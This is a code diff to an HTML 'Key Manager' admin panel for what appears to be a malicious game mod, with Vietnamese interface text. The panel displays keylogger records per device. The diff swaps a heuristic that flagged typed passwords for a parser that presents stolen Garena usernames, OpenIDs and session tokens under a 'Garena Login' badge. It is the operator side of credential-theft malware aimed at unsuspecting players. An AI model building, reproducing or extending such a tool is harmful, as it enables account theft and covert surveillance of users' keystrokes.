@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🔐 Key Manager - LQ Mod5</title>
+<title>🔐 Key Manager - LQ Mod6</title>
 <style>
   :root {
     --bg: #0a0e1a;
@@ -1646,7 +1646,7 @@ async function klLoadLog(deviceId) {
         '<div style="text-align:center;color:var(--text2);padding:40px;line-height:2">' +
         '<div style="font-size:28px">⌨️</div>' +
         '<div>Chưa có dữ liệu bàn phím.</div>' +
-        '<div style="font-size:11px;opacity:.6">Sẽ hiện ngay khi người dùng gõ bất kỳ thứ gì (màn login, in-game, chat).</div>' +
+        '<div style="font-size:11px;opacity:.6">Sẽ hiện sau khi người dùng đăng nhập Garena thành công.</div>' +
         '</div>';
       document.getElementById('kl-copy-btn').style.display = 'none';
       return;
@@ -1660,14 +1660,23 @@ async function klLoadLog(deviceId) {
       }) : '';
       const num = total - i;
       const txt = l.text || '';
-      // Nhận dạng: không có khoảng trắng + ngắn → có thể là key/pass đăng nhập
-      const isCredLike = txt.length > 0 && txt.length <= 50 && !/\s/.test(txt);
-      return `<div class="kl-row${isCredLike ? ' kl-row-cred' : ''}">
+      // Parse multi-line format: [User] xxx\n[OpenID] xxx\n[Token] xxx
+      const lines = txt.split('\n').filter(x => x.trim());
+      const isGarenaLogin = lines.some(ln => ln.startsWith('[User]') || ln.startsWith('[OpenID]') || ln.startsWith('[Token]'));
+      const bodyHtml = isGarenaLogin
+        ? lines.map(ln => {
+            if (ln.startsWith('[User]'))   return `<div class="kl-field"><span class="kl-field-key">👤 User</span><span class="kl-field-val">${escapeHtml(ln.replace('[User]','').trim())}</span></div>`;
+            if (ln.startsWith('[OpenID]')) return `<div class="kl-field"><span class="kl-field-key">🆔 OpenID</span><span class="kl-field-val">${escapeHtml(ln.replace('[OpenID]','').trim())}</span></div>`;
+            if (ln.startsWith('[Token]'))  return `<div class="kl-field"><span class="kl-field-key">🔑 Token</span><span class="kl-field-val kl-token">${escapeHtml(ln.replace('[Token]','').trim())}</span></div>`;
+            return `<div>${escapeHtml(ln)}</div>`;
+          }).join('')
+        : `<div class="kl-text">${escapeHtml(txt)}</div>`;
+      return `<div class="kl-row${isGarenaLogin ? ' kl-row-cred' : ''}">
         <div class="kl-ts">
           <span>#${num} · ${ts}</span>
-          ${isCredLike ? '<span class="kl-badge">🔑 Credential</span>' : '<span class="kl-badge kl-badge-chat">💬 Text</span>'}
+          ${isGarenaLogin ? '<span class="kl-badge">🎮 Garena Login</span>' : '<span class="kl-badge kl-badge-chat">📝 Log</span>'}
         </div>
-        <div class="kl-text">${escapeHtml(txt)}</div>
+        ${bodyHtml}
       </div>`;
     }).join('');
   } catch(e) {
@@ -1720,6 +1729,10 @@ function escapeHtml(s) {
 .kl-ts        { font-size:10px;color:var(--text2);margin-bottom:5px;display:flex;align-items:center;gap:8px;flex-wrap:wrap; }
 .kl-text      { font-size:13px;color:var(--text);word-break:break-all;font-family:monospace;line-height:1.5; }
 .kl-badge     { font-size:9px;padding:2px 7px;border-radius:20px;background:rgba(245,158,11,.15);color:#fbbf24;border:1px solid rgba(245,158,11,.3);white-space:nowrap; }
+.kl-field     { display:flex;gap:8px;align-items:flex-start;margin:3px 0; }
+.kl-field-key { font-size:11px;color:var(--text2);white-space:nowrap;min-width:70px;padding-top:1px; }
+.kl-field-val { font-size:13px;color:var(--text1);word-break:break-all; }
+.kl-token     { font-size:11px;color:#a5b4fc;font-family:monospace; }
 .kl-badge-chat{ background:rgba(99,102,241,.15);color:#a5b4fc;border-color:rgba(99,102,241,.3); }
 </style>
 </body>
